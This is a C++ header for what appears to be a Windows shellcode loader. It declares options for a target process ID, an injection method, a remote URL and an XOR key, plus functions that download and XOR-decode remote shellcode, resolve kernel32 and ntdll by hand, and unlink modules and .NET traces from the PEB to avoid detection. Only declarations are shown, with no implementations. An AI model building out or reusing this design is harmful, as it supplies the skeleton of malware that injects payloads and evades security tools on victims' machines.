#pragma once
#include "def.h"

#include <string>
#include <vector>
#include "http.hpp"
#include <algorithm>

class helper {

public:
    struct Options {
		std::string mode;
		std::wstring filePath;
		std::wstring args;
        int pid = 0;
        std::string method;
        bool useRemote = false;

        std::wstring url;
        std::wstring file;
        bool https = false;
        unsigned char key = 0x67;
    };
    void printHelp(const char* programName);
    Options parseArgs(int argc, char* argv[]);
    unsigned long simpleHash(const std::string& input);
    PVOID GetModuleBase(const wchar_t* moduleName);
    static void xor_decode(char* data, int len, char key);

    static void xor_shellcode(unsigned char* data, int len, unsigned char shellcode_key);



    unsigned char* getKernel32();
    

    unsigned char* getNtdll();
    void UnlinkModuleFromPEB(std::wstring targetName);
    std::vector<unsigned char> fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key, bool https);
    void ClearDotNetFromPeb();
};

extern helper helperHandler;